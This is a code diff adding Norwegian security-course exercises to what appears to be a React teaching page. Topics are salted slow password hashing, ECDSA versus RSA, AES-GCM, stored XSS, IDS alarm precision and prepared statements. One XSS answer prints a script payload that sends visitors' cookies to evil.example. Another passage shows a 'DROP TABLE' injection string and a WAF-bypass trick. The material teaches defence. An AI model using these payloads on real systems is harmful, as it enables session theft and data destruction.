+          slipper gjennom escape-funksjonen som bare håndterer apostrofer. Eller serveren bruker
+          MySQL's <code>mysql_real_escape_string</code> som er bevisst feil-tunet hvis tegnsettet er
+          ulikt det driveren tror. WAF-er som blokkerer SQL-nøkkelord brytes med kommentar-
+          inkludering (<code>UN/**/ION</code>) eller obfuskering.
+        </p>
+        <p>
+          Prepared statements eliminerer hele problem-klassen ved å SKILLE syntaks fra data på
+          protokoll-nivå. SQL-strengen sendes først til databasen, som parser den og lager en
+          execution-plan med placeholders. Senere sendes verdiene som binær data adskilt fra
+          SQL-strukturen. Selv om verdien er <code>'; DROP TABLE users; --</code> er den fra
+          databasens perspektiv bare en literal streng som havner i WHERE-klausulen — den kan aldri
+          endre strukturen. Det er ikke et filter; det er en arkitektonisk separasjon. Derfor er
+          parameter-binding (eller en ORM som bruker det under panseret) det eneste ekte forsvaret.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: SQL-injeksjon-fiks med forberedt spørring">
         <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
@@ -1096,6 +1723,173 @@ function Section810() {
           </>
         }
       />
+
+      <Exercise
+        question="En logge-server lagrer passord som SHA-256-hash uten salt. En angriper får tak i hele tabellen. Forklar to angreps-strategier (rainbow-table og brute-force per bruker) og hva som hadde stoppet hver av dem."
+        hint="Hva er kostnaden ved å regne ut én SHA-256? Hva endrer seg hvis hver bruker har sin egen salt?"
+        answer={
+          <>
+            <p>
+              <strong>Strategi 1 — rainbow-table:</strong> Angriper laster ned en forhåndsregnet
+              tabell av (passord, SHA-256(passord)) for de mest brukte passordene (ca. 14 mill. mest
+              sannsynlige). For HVER lekket hash sjekker hun oppslag i tabellen — finner en match i
+              løpet av millisekunder. Hele tabellen er ca. 500 GB, men én engangskostnad.
+            </p>
+            <p className="mt-2">
+              <strong>Forsvar:</strong> per-bruker <strong>salt</strong> — en tilfeldig verdi
+              (typisk 16 byte) som lagres sammen med hashen og er en del av input:
+              <code> hash = SHA256(salt ‖ passord)</code>. Nå må angriperen lage en egen
+              rainbow-table per bruker, og 500 GB × antall brukere er ikke gjennomførbart.
+            </p>
+            <p className="mt-2">
+              <strong>Strategi 2 — brute-force per bruker:</strong> Selv med salt kan angriper prøve
+              én og én bruker: for hver kandidat-passord, regn ut hash med dens salt og sammenlign.
+              SHA-256 er rask — moderne GPU gjør milliarder per sekund. Et 8-tegns passord brytes på
+              timer.
+            </p>
+            <p className="mt-2">
+              <strong>Forsvar:</strong> <strong>treg KDF</strong> — bcrypt, scrypt, argon2id. Disse
+              er bevisst designet til å være tunge (10-100 ms per hash), minne-bundne (vanskelig å
+              parallellisere på GPU/ASIC). Med argon2id à 100 ms tar samme brute-force fra timer til
+              hundretusenvis av år.
+            </p>
+            <p className="mt-2 text-muted-foreground">
+              Salt løser rainbow-table; treg KDF løser brute-force. Begge må til samtidig.
+              SHA-256-alene er ikke et passord-hash, og var aldri ment som det.
+            </p>
+          </>
+        }
+      />
+
+      <Exercise
+        question="Bedriften vurderer å erstatte sine ECDSA-sertifikater (256-bit) med RSA-3072. En leverandør hevder RSA er «tryggere fordi nøklene er lengre». Argumenter for eller imot, og estimer kostnaden i handshake-bytes og signering-tid."
+        hint="Hva er sikkerhets-nivået i bits for hver, og hva er størrelsen på en signatur?"
+        answer={
+          <>
+            <p>
+              Leverandørens argument er feil. Sikkerhets-nivået måles i <em>brute-force-bit</em>,
+              ikke nøkkel-lengde. 256-bit ECDSA gir ca. 128-bit sikkerhetsnivå (best kjente angrep
+              er Pollard rho, sqrt-tid). RSA-3072 gir også ca. 128-bit sikkerhet (general number
+              field sieve). De er ekvivalente.
+            </p>
+            <p className="mt-2">
+              <strong>Kostnad i handshake-bytes:</strong> Et RSA-3072 sertifikat har offentlig
+              nøkkel på 384 byte, signatur 384 byte. ECDSA-P256 har 64 byte nøkkel, 64 byte
+              signatur. Et sertifikat-kjede på 3 sertifikater: RSA gir ca. 1.2 KB ekstra per
+              handshake mot ECDSA. På mobile nett med pakke-tap er det merkbart.
+            </p>
+            <p className="mt-2">
+              <strong>Signering-tid:</strong> RSA-3072 signering tar ca. 2-5 ms på moderne CPU;
+              ECDSA-P256 ca. 0.1 ms. Servere som gjør tusenvis av TLS-handshakes per sekund vil
+              merke 20-50x forskjell. RSA-verifikasjon er derimot rask (~0.1 ms) fordi den bruker
+              liten eksponent.
+            </p>
+            <p className="mt-2 text-muted-foreground">
+              Konklusjon: behold ECDSA (eller Ed25519 for nyere systemer). RSA-3072 er ikke
+              «tryggere» — bare større og tregere. Eneste reelle grunn til å velge RSA er
+              kompatibilitet med eldre klienter som ikke støtter ECDSA.
+            </p>
+          </>
+        }
+      />
+
+      <Exercise
+        question="Du designer et meldings-system og lurer på om du skal velge AES-CBC + HMAC eller AES-GCM. Begge gir konfidensialitet og integritet. Hva er de viktigste forskjellene, og hvilken anbefaler du?"
+        hint="Tenk på hva som kan gå galt i implementasjonen, og hvilken rekkefølge av kryptering og MAC som er trygg."
+        answer={
+          <>
+            <p>
+              <strong>AES-CBC + HMAC</strong> krever to nøkler (én for kryptering, én for MAC), en
+              uforutsigbar IV per melding, og kritisk: riktig rekkefølge. Encrypt-then-MAC er
+              beviselig riktig; MAC-then-encrypt (slik SSL/TLS gjorde det) skapte angrep som POODLE
+              og Lucky-13 fordi feilmeldinger fra padding-sjekk lekket informasjon (padding oracle).
+              Implementasjonen må også være konstant-tid i MAC-sammenligningen.
+            </p>
+            <p className="mt-2">
+              <strong>AES-GCM</strong> er én primitiv (AEAD) som gjør kryptering OG autentisering i
+              én operasjon. Én nøkkel, én nonce. Implementasjonen kan ikke «velge feil rekkefølge» —
+              det er ingen rekkefølge å velge. Hardware-akselerert (AES-NI + PCLMULQDQ) på alle
+              moderne CPU-er.
+            </p>
+            <p className="mt-2">
+              <strong>GCM-fotfellen:</strong> hvis (nøkkel, nonce) gjenbrukes er det katastrofalt —
+              autentisering brytes og klartekst-XOR kan leses. Med 96-bits nonce er tilfeldig
+              kollisjon trygt opp til ca. 2^32 meldinger per nøkkel. For større volum, bruk
+              telle-basert nonce eller XChaCha20-Poly1305 med 192-bits nonce.
+            </p>
+            <p className="mt-2 text-muted-foreground">
+              <strong>Anbefaling:</strong> AES-GCM (eller ChaCha20-Poly1305 hvis du ikke har
+              AES-hardware). AEAD-modi lukker hele klasser av implementasjons-feil. CBC + HMAC
+              eksisterer i dag bare for legacy-systemer.
+            </p>
+          </>
+        }
+      />
+
+      <Exercise
+        question="En webapp viser brukerens kallenavn på siden slik: <p>Hei, ${'{'}<i>user.name</i>{'}'}!</p> der user.name kommer fra registrering. Identifiser XSS-typen, gi en angreps-payload, og forklar både escape- og CSP-forsvar."
+        hint="Hva slags input bryter ut av <p>-konteksten?"
+        answer={
+          <>
+            <p>
+              Dette er <strong>stored XSS</strong>: kallenavnet lagres i databasen og leveres ut
+              hver gang noen leser siden. Angreps-payload: angriperen registrerer seg med kallenavn{" "}
+              <code>{'<script>fetch("https://evil.example/?c="+document.cookie)</script>'}</code>.
+              Hver fremtidig besøkende eksekverer det og lekker sin sesjons-cookie.
+            </p>
+            <p className="mt-2">
+              <strong>Forsvar 1 — kontekst-bevisst escape:</strong> server-side templating må
+              HTML-escape variabler i HTML-kontekst:
+              <code> &lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>,{" "}
+              <code>&quot;</code> → <code>&amp;quot;</code>, <code>&amp;</code> →{" "}
+              <code>&amp;amp;</code>. De fleste templating-engines (Jinja, ERB, JSX) gjør dette by
+              default på interpolasjon. Du må aktivt skru det av (eks.{" "}
+              <code>{"{{ x | safe }}"}</code>) for å være sårbar.
+            </p>
+            <p className="mt-2">
+              <strong>Forsvar 2 — Content-Security-Policy:</strong> server sender header
+              <code> Content-Security-Policy: default-src 'self'; script-src 'self'</code>. Selv om
+              et skript-tag SKULLE havne i HTML, nekter nettleseren å eksekvere det fordi det er
+              inline. Krever at all egen JS er i eksterne filer eller har en nonce.
+            </p>
+            <p className="mt-2 text-muted-foreground">
+              <strong>Defense in depth:</strong> bruk begge. Escape stopper det meste; CSP er et
+              sikkerhetsnett som demper konsekvensene hvis escape glipper et sted i kodebasen. Sett
+              også HttpOnly på sesjons-cookies så <code>document.cookie</code> ikke avslører dem til
+              JS i utgangspunktet.
+            </p>
+          </>
+        }
+      />
+
+      <Exercise
+        question="En IDS overvåker 10 Gbps trafikk. Hver pakke har 0.001 % sjanse for å være ondsinnet. Detektoren har 99.5 % sensitivitet (true-positive-rate) og 0.05 % false-positive-rate. Hva er presisjonen av en alarm — altså sannsynligheten for at en alarm faktisk er et angrep? Hva forteller resultatet om driftspraksis?"
+        hint="Bayes' setning. Beregn først forventet antall pakker av hver type per sekund."
+        answer={
+          <>
+            <p>Anta gjennomsnittlig pakke-størrelse 1000 bit → 10^7 pakker/sek på 10 Gbps.</p>
+            <ul className="list-disc pl-5 mt-1 space-y-1">
+              <li>Ondsinnede pakker: 10^7 × 0.00001 = 100/sek</li>
+              <li>Godartede pakker: 10^7 × 0.99999 ≈ 10^7/sek</li>
+              <li>True positives: 100 × 0.995 = 99.5/sek</li>
+              <li>False positives: 10^7 × 0.0005 = 5000/sek</li>
+              <li>Totale alarmer: 5099.5/sek</li>
+            </ul>
+            <p className="mt-2">
+              Presisjon = TP / (TP + FP) = 99.5 / 5099.5 ≈ <strong>1.95 %</strong>. Bare ca. 2 av
+              hundre alarmer er ekte angrep. Operatøren drukner i støy.
+            </p>
+            <p className="mt-2 text-muted-foreground">
+              <strong>Driftspraksis:</strong> (1) Reduser FPR ved å tune regler aggressivt — selv en
+              halvering av FPR til 0.025 % dobler presisjonen. (2) Korreler over flere kilder
+              (SIEM): «alarm fra IDS + uvanlig DNS-oppslag fra samme host + login fra ukjent land»
+              har mye høyere posterior. (3) Bruk EDR for å hente kontekst per host. (4) Aksepter at
+              ren signatur-IDS på rå pakke-strøm har en gulvgrense — derfor er moderne SOC-er bygd
+              på korrelering, ikke enkelt-alarmer.
+            </p>
+          </>
+        }
+      />
     </article>
   );
 }
@@ -1209,6 +2003,18 @@ function Exercise({
   );
 }
 
+function Hvorfor({ title, children }: { title: string; children: React.ReactNode }) {
+  return (
+    <div className="rounded-xl border border-sky-500/30 bg-sky-500/5 p-4">
+      <div className="text-[10px] uppercase tracking-wider text-sky-700 dark:text-sky-400 font-semibold mb-1">
+        Hvorfor?
+      </div>
+      <div className="font-semibold text-foreground mb-1">{title}</div>
+      <div className="text-muted-foreground text-[13px] space-y-2">{children}</div>
+    </div>
+  );
+}
+
 function RelatedSlugs({ slugs }: { slugs: string[] }) {
   return (
     <div className="rounded-xl border border-border bg-card p-3">
@@ -1230,7 +2036,6 @@ function RelatedSlugs({ slugs }: { slugs: string[] }) {
     </div>
   );
 }
-
 
 // ============================================================
 // SVG-illustrasjoner — alle original-tegnet
